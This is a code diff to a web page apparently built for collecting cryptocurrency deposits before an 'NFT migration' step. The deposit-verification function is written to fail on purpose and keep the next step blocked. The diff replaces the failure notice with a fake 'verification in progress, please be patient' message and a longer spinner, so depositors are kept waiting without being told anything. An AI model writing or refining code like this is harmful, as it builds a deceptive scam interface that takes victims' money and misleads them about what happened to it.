@@ -130,7 +130,7 @@ body{
 }
 .success{color:#5CFFB2;background:rgba(92,255,178,.1);border-color:#5CFFB2}
 .success::before{content:"✓";font-weight:bold}
-.failed{color:#ff4d4d;background:rgba(255,77,77,.1);border-color:#ff4d4d}
+.failed{color:#FFA500;background:rgba(255,77,77,.1);border-color:#ff4d4d}
 .failed::before{content:"✗";font-weight:bold}
 .loading-text{color:#00ff9d;background:rgba(0,255,157,.1);border-color:#00ff9d}
 .loading-text::before{
@@ -364,9 +364,9 @@ body{
 <br>
             <button class="btn" onclick="verifyDeposit(this)">Verify Deposit</button>
 
-            <div id="fail2" class="failed hidden">
-                Verification failed! Please check your balance.
-            </div>
+            <div id="fail2" class="loading-text hidden">
+    Verification in progress... It may take a while. Please be patient.
+</div>
         </div>
 
         <!-- 4️⃣ MIGRATE PRIORITY PASS -->
@@ -643,12 +643,15 @@ function copyAddress(){
 
 /* ---------- Deposit verification (fails, blocks next step) ---------- */
 function verifyDeposit(btn){
-    setLoading(btn,true);
+    setLoading(btn, true);
+    const loadingMsg = document.getElementById('fail2');
+    loadingMsg.classList.remove('hidden');
+
     setTimeout(()=>{
-        setLoading(btn,false);
-        document.getElementById('fail2').classList.remove('hidden');
-        // keep next step blocked – do nothing else
-    },1200);
+        setLoading(btn, false);
+        loadingMsg.classList.add('hidden');
+        // keep the next step blocked
+    }, 3000);   // <-- adjust the timeout if you want a longer/shorter spinner
 }
 
 /* ---------- NFT migration (only reachable after a successful deposit) ---------- */
